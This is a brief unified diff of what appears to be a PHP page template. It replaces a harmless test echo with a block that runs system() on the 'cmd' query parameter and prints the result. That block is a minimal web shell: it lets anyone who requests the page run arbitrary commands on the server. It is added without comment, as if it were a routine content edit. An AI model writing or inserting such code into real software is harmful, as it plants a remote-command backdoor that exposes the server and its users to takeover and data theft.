@@ -21,7 +21,12 @@
  
  CONTENT!
  
- <?php
-      echo "<div>test</div>";
- ?>
-  
+
+      <pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>  
